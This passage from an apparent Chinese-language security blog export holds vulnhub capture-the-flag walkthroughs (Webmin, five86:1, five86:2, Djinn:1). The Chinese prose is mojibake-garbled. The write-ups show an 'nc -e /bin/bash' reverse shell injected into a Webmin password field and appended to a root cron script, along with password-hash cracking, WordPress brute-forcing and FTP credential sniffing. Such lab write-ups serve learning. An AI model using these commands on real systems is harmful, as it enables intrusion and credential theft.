Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.2.156:13337&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxx&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|nc -e &#x2F;bin&#x2F;bash 192.168.2.143 8848 &amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.2.156: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.2.143] from (UNKNOWN) [192.168.2.156] 40030</span><br><span class="line">whoami</span><br><span class="line">nezuko</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:&#x2F;home&#x2F;zenitsu:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>å¤åˆ¶åˆ°ä¸»æœºï¼Œä½¿ç”¨<code>john</code> ç ´è§£hashï¼Œå¾—åˆ°å¯†ç <code>meowmeow</code></p><blockquote><p>  ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œsshç›´æ¥è¿ zenitsu è¿ä¸ä¸Šï¼Œæ‰€ä»¥å°±é‡‡ç”¨äº†åˆ«çš„åŠæ³•</p></blockquote><p>ä½¿ç”¨<code>ssh-keygen</code> ç”Ÿæˆä¸€ä¸ªsshç§é’¥ï¼Œå¹¶æŠŠå®ƒå†™å…¥åˆ°<code>nezuko/.ssh/au*</code> ä¸‹</p><p>ç„¶åç”¨sshè¿ä¸Š <code>nezuko</code>ï¼Œåˆ‡æ¢åˆ° <code>zenitsu</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">zenitsu@ubuntu:/home/nezuko$ whoami</span><br><span class="line">zenitsu</span><br><span class="line">zenitsu@ubuntu:/home/nezuko$ ls</span><br><span class="line">from_zenitsu  nezuko.txt</span><br><span class="line">zenitsu@ubuntu:/home/nezuko$ cd from_zenitsu/</span><br><span class="line">zenitsu@ubuntu:/home/nezuko/from_zenitsu$ ls -l</span><br><span class="line">total 40</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:15 new_message_06-07-2020_15:15</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:20 new_message_06-07-2020_15:20</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:25 new_message_06-07-2020_15:25</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:30 new_message_06-07-2020_15:30</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:35 new_message_06-07-2020_15:35</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_01:13</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:11</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:12</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:13</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:40</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰æ¯éš” 5min åˆ›å»ºçš„æ¶ˆæ¯ï¼Œå¹¶ä¸”åˆ›å»ºè€…æ˜¯root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">zenitsu@ubuntu:/home/nezuko/from_zenitsu$ cd ~/</span><br><span class="line">zenitsu@ubuntu:~$ ls</span><br><span class="line">to_nezuko  zenitsu.txt</span><br><span class="line">zenitsu@ubuntu:~$ cd to_nezuko/</span><br><span class="line">zenitsu@ubuntu:~/to_nezuko$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 zenitsu root    4096 Ogos 21  2019 .</span><br><span class="line">drwxr-xr-x 4 zenitsu zenitsu 4096 Ogos 21  2019 ..</span><br><span class="line">-rw-r--r-- 1 zenitsu root     150 Ogos 21  2019 send_message_to_nezuko.sh</span><br></pre></td></tr></table></figure><p>æœ¬ç›®å½•ä¸‹æœ‰ä¸€ä¸ªshè„šæœ¬ï¼Œåº”è¯¥ä¹Ÿæ˜¯5åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯å†™ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zenitsu@ubuntu:~/to_nezuko$ echo &quot;nc -e /bin/bash 192.168.2.143 8848&quot; &gt;&gt; send_message_to_nezuko.sh </span><br></pre></td></tr></table></figure><p>æœ¬åœ°ç›‘å¬ï¼Œç­‰å¾…åå¼¹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.2.156: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.2.143] from (UNKNOWN) [192.168.2.156] 39652</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> neizikochan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> opennetadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub five86:2é¶æœº</title>
      <link href="/five86-2.html"/>
      <url>/five86-2.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ five86:2 é¶æœº</p><p>ç®€å•/ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86:2"></a>Five86:2</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for Five86-2 (192.168.2.164)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp</span><br><span class="line">80/tcp open   http</span><br><span class="line">MAC Address: 00:0C:29:03:0D:4B (VMware)</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# nmap -Pn 192.168.2.164 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for Five86-2 (192.168.2.164)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.1.4</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Five86-2 &amp;#8211; Just another WordPress site</span><br></pre></td></tr></table></figure><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>å…ˆä¿®æ”¹<code>/etc/hosts</code>æ–‡ä»¶ï¼Œ</p><img src="five86:2/image-20200710174649901.png" alt="image-20200710174649901" style="zoom:50%;" /><p>è®¿é—®ä¹‹åæ˜¯ä¸€ä¸ªwordpress</p><img src="five86:2/image-20200710174712619.png" alt="image-20200710174712619" style="zoom:50%;" /><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p>ä½¿ç”¨<code>wpscan</code>å·¥å…·è¿›è¡Œæ‰«æçˆ†ç ´ç”¨æˆ·å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# wpscan --url http://192.168.2.164 --enumerate u</span><br></pre></td></tr></table></figure><img src="five86:2/image-20200710174858886.png" alt="image-20200710174858886" style="zoom:50%;" /><p>ä½¿ç”¨<code>rock_you.txt</code>çˆ†ç ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# wpscan --url http://192.168.2.164 -U ../2/username -P /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><img src="five86:2/image-20200710175051573.png" alt="image-20200710175051573" style="zoom:50%;" /><p>ä½¿ç”¨ç¬¬ä¸€ä¸ªè´¦æˆ·ç™»é™†wordpressï¼Œ</p><p>çœ‹ä¸€ä¸‹æ’ä»¶åˆ—è¡¨</p><img src="five86:2/image-20200710175456330.png" alt="image-20200710175456330" style="zoom:50%;" /><p>ç”¨<code>searchsploit</code>æŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ç”¨çš„è„šæœ¬</p><img src="five86:2/image-20200710175555690.png" alt="image-20200710175555690" style="zoom:50%;" /><img src="five86:2/image-20200710175630756.png" alt="image-20200710175630756" style="zoom:50%;" /><img src="five86:2/image-20200710175705366.png" alt="image-20200710175705366" style="zoom:50%;" /><p>ç¬¬ä¸‰ä¸ªæ’ä»¶æœ‰é—®é¢˜</p><img src="five86:2/image-20200710175816709.png" alt="image-20200710175816709" style="zoom:50%;" /><p>æŒ‰ç…§æ­¥éª¤æ¥ï¼Œæˆ‘æŠŠ<code>index.php</code>é‡Œé¢çš„åé—¨æ¢æˆäº†åå¼¹shell</p><p>æœ¬åœ°ç›‘å¬ï¼Œè®¿é—®å³å¯å¾—åˆ°shell</p><img src="five86:2/image-20200710175924285.png" alt="image-20200710175924285" style="zoom:50%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åˆ‡æ¢åˆ°<code>stephen</code>è´¦æˆ·ï¼Œå› ä¸ºè¿™ä¸ªè´¦æˆ·çš„å¯†ç å’Œwordpressä¸Šé¢çš„ä¸€æ ·ã€‚</p><p>é¡ºä¾¿æ¢ä¸€ä¸‹ç»ˆç«¯</p><img src="five86:2/image-20200710180052997.png" alt="image-20200710180052997" style="zoom:50%;" /><p>ç„¶åä½¿ç”¨<code>ps -auxwww</code>æŸ¥çœ‹è¿›ç¨‹</p><img src="five86:2/image-20200710180211630.png" alt="image-20200710180211630" style="zoom:50%;" /><p>å‘ç°ftpæ˜¯ç”±<code>paul</code>è´¦æˆ·è¿è¡Œçš„</p><p><font color='red'>ç”±äºftpæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œå¯ä»¥ä½¿ç”¨æŠ“åŒ…æ¥æŠ“å–ç”¨æˆ·åå’Œå¯†ç </font></p><img src="five86:2/image-20200710180343480.png" alt="image-20200710180343480" style="zoom:50%;" /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stephen@five86-2:~$timeout 150 tcpdump -i veth5e2d224 -w cap.pcap</span><br><span class="line">stephen@five86-2:~$tcpdump -r cap.pcap | grep &quot;PASS&quot;    </span><br></pre></td></tr></table></figure><img src="five86:2/image-20200710180512115.png" alt="image-20200710180512115" style="zoom:50%;" /><p>å¾—åˆ°äº†å¯†ç </p><p>åˆ‡æ¢åˆ°<code>paul</code>è´¦æˆ·</p><img src="five86:2/image-20200710180539882.png" alt="image-20200710180539882" style="zoom:50%;" /><p>æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥ææƒçš„ç¨‹åº</p><img src="five86:2/image-20200710180610970.png" alt="image-20200710180610970" style="zoom:33%;" /><p><code>service</code>æ˜¯å¯ä»¥ä¸ç”¨å¯†ç è¿è¡Œçš„ï¼Œåˆ‡æ¢åˆ°peterè´¦æˆ·</p><img src="five86:2/image-20200710180659729.png" alt="image-20200710180659729" style="zoom:33%;" /><p>ç»§ç»­çœ‹èƒ½ææƒçš„ç¨‹åº</p><img src="five86:2/image-20200710180735697.png" alt="image-20200710180735697" style="zoom:33%;" /><p>èƒ½ç”¨<code>passwd</code>ï¼Œé‚£å°±ç”¨å®ƒä¿®æ”¹<code>root</code>çš„å¯†ç </p><img src="five86:2/image-20200710180828436.png" alt="image-20200710180828436" style="zoom:33%;" /><p>æˆåŠŸææƒ</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub five86:1é¶æœº</title>
      <link href="/five86-1.html"/>
      <url>/five86-1.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ five86:1 é¶æœº</p><p>ç®€å•/ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86:1"></a>Five86:1</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.163</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn -A 192.168.2.163 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/ona</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; Charset=iso-8859-1).</span><br></pre></td></tr></table></figure><h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><p>çœ‹åˆ°<code>webadmin</code>ä»¥ä¸ºç¨³äº†ï¼Œæ‹¿å‡ºç†Ÿæ‚‰çš„è„šæœ¬ï¼Œå‘ç°å¹¶ä¸è¡Œäº†</p><img src="five86:1/image-20200710152751273.png" alt="image-20200710152751273" style="zoom:50%;" /><p>è¿™é‡Œçœ‹æ ·å­ä¸è¡Œ</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>è®¿é—®ç½‘é¡µå‘ç°å•¥ä¹Ÿæ²¡æœ‰</p><img src="five86:1/image-20200710152841189.png" alt="image-20200710152841189" style="zoom:50%;" /><p>æƒ³åˆ°æœ‰ä¸€ä¸ª<code>robots.txt</code>ï¼Œæ‰“å¼€ä¸€çœ‹</p><img src="five86:1/image-20200710152903806.png" alt="image-20200710152903806" style="zoom:50%;" /><p>æœ‰ä¸€ä¸ª<code>/ona</code>ï¼Œè®¿é—®ä¸€ä¸‹çœ‹çœ‹</p><img src="five86:1/image-20200710152930660.png" alt="image-20200710152930660" style="zoom:50%;" /><p>æ˜¯ä¸€ä¸ª<code>opennetadmin</code>ï¼Œä½¿ç”¨<code>searchexplot</code> çœ‹çœ‹æœ‰æ²¡æœ‰ç°æˆçš„exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# searchsploit opennetadmin</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                       |  Path</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution        | php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Met | php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution          | php/webapps/47691.sh</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure><p>æ‹¿æœ€æ–°ç‰ˆ<code>remote code execution</code>è¯•è¯•</p><img src="five86:1/image-20200710153128235.png" alt="image-20200710153128235" style="zoom:50%;" /><p>æ‹¿åˆ°äº†ä¸€ä¸ªwebshell</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰<code>setuid</code>çš„ä¸œè¥¿</p><img src="five86:1/image-20200710153207499.png" alt="image-20200710153207499" style="zoom:50%;" /><p>çœ‹åˆ°<code>exim4</code>ï¼Œä»¥ä¸ºåˆç¨³äº†ï¼Œå‡†å¤‡æ‹¿å‡º<code>46996.sh</code>æ¥ç›´æ¥æ”»å‡»ï¼Œå‘ç°è¿<code>/tmp</code>ç›®å½•éƒ½ä¸èƒ½å†™</p><p>æ‰¾ä¸€ä¸‹<code>www-data</code>èƒ½è®¿é—®çš„æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find / -<span class="built_in">type</span> f -user www-data</span></span><br><span class="line">/var/www/html/reports/.htaccess</span><br><span class="line">/var/log/ona.log</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹<code>.htaccess</code>æ–‡ä»¶</p><img src="five86:1/image-20200710153411287.png" alt="image-20200710153411287" style="zoom:50%;" /><p>å†çœ‹ä¸€ä¸‹<code>/var/www/.htpasswd</code></p><img src="five86:1/image-20200710153435351.png" alt="image-20200710153435351" style="zoom:50%;" /><p>ç»™äº†æç¤ºï¼Œä½¿ç”¨<code>aefhrt</code>ç”Ÿæˆ10ä¸ªå­—ç¬¦çš„å¯†ç æœ¬</p><p>ä½¿ç”¨<code>crunch</code> å·¥å…·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# crunch 10 10 aefhrt &gt; 1.txt</span><br><span class="line">Crunch will now generate the following amount of data: 665127936 bytes</span><br><span class="line">634 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 60466176 </span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨<code>john</code> çˆ†ç ´</p><img src="five86:1/image-20200710153640169.png" alt="image-20200710153640169" style="zoom:50%;" /><p>sshè¿æ¥ä¸Šå»ï¼Œæ‰¾ä¸€ä¸‹å¯ä»¥ææƒçš„ç©æ„</p><img src="five86:1/image-20200710153724798.png" alt="image-20200710153724798" style="zoom:50%;" /><p>å‘ç°å¯ä»¥ä¸ç”¨å¯†ç  ä»¥ jen çš„èº«ä»½è¿è¡Œ <code>/bin/cp</code>ï¼Œé‚£å°±æŠŠ<code>sshå¯†é’¥</code>ç»™å®ƒæ‹·è´åˆ°jené‡Œé¢ï¼Œå®ç°ç”¨æˆ·åˆ‡æ¢</p><img src="five86:1/image-20200710153836025.png" alt="image-20200710153836025" style="zoom:50%;" /><p>sshè¿æ¥åˆ°jenè´¦æˆ·</p><p>æç¤ºåœ¨<code>/var/mail/jen</code>ä¸‹æœ‰ä¸€å°é‚®ä»¶</p><img src="five86:1/image-20200710154036607.png" alt="image-20200710154036607" style="zoom: 33%;" /><p>å¾—åˆ°äº†<code>moss</code>çš„å¯†ç ï¼Œåˆ‡æ¢åˆ° mossç”¨æˆ·</p><p>å‘ç°å…¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæœ‰<code>setuid</code>æƒé™çš„<code>root</code>è´¦æˆ·çš„ç¨‹åº</p><img src="five86:1/image-20200710154142971.png" alt="image-20200710154142971" style="zoom:50%;" /><p>è¿è¡Œä¹‹åï¼Œä¸è®ºè¾“å…¥å•¥ï¼Œéƒ½å¯ä»¥å¾—åˆ°rootæƒé™</p><img src="five86:1/image-20200710154217425.png" alt="image-20200710154217425" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> opennetadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub Djinn:1é¶æœº</title>
      <link href="/Djinn-1.html"/>
      <url>/Djinn-1.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ Djinn:1 é¶æœº</p><p>ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn:1"></a>Djinn:1</h1><img src="./Djinn:1/image-20200718152057202.png" alt="image-20200718152057202" style="zoom:25%;" /><p>æ‰«æä¹‹åå‘ç°å¼€å¯äº† <code>21,22,1337,7331</code>å››ä¸ªç«¯å£</p><p>å…¶ä¸­ ssh å¤„äº <code>filtered</code> çŠ¶æ€</p><h2 id="1337ç«¯å£"><a href="#1337ç«¯å£" class="headerlink" title="1337ç«¯å£"></a>1337ç«¯å£</h2><p>æ˜¯ä¸€ä¸ªå°æ¸¸æˆ</p><img src="Djinn:1/image-20200718152159308.png" alt="image-20200718152159308" style="zoom:25%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.2.170&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;gift.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">arg1, arg2, case</span>):</span></span><br><span class="line"><span class="keyword">if</span> (case == <span class="string">&quot;+&quot;</span>):</span><br><span class="line"><span class="keyword">return</span> arg1 + arg2</span><br><span class="line"><span class="keyword">elif</span> (case == <span class="string">&quot;-&quot;</span>):</span><br><span class="line"><span class="keyword">return</span> arg1 - arg2</span><br><span class="line"><span class="keyword">elif</span> (case == <span class="string">&quot;*&quot;</span>):</span><br><span class="line"><span class="keyword">return</span> arg1 * arg2</span><br><span class="line"><span class="keyword">elif</span> (case == <span class="string">&quot;/&quot;</span>):</span><br><span class="line"><span class="keyword">return</span> arg1 / arg2</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">print(<span class="string">&quot;case: &quot;</span>, case)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">sh.recvuntil(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">arg1 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">case = sh.recv(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">arg2 = <span class="built_in">float</span>(sh.recvuntil(<span class="string">&quot;)&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">ans = function(arg1, arg2, case)</span><br><span class="line"><span class="comment">#print(&quot;ans: &quot;, ans)</span></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>pwntools</code>ç¼–å†™expï¼Œå¾—åˆ°ç»“æœ</p><img src="Djinn:1/image-20200718152949625.png" alt="image-20200718152949625" style="zoom:25%;" /><p>æˆ‘çŒœæ˜¯ç«¯å£æ•²é—¨æœåŠ¡ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ï¼Œæ•²äº†é—¨ä¹‹åsshåè€Œcloseäº†ï¼ˆä¼šä¸ä¼šæ˜¯æˆ‘æ•²é—¨çš„æ“ä½œä¸å¯¹ï¼‰</p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>è§‚å¯Ÿåˆ°ftpç«¯å£æ‰«æçš„ç»“æœï¼Œç›´æ¥å‡ºç°äº†æ–‡ä»¶çš„åå­—ï¼Œå¹¶ä¸”å…è®¸åŒ¿åç™»é™†ã€‚</p><img src="Djinn:1/image-20200718153356511.png" alt="image-20200718153356511" style="zoom:25%;" 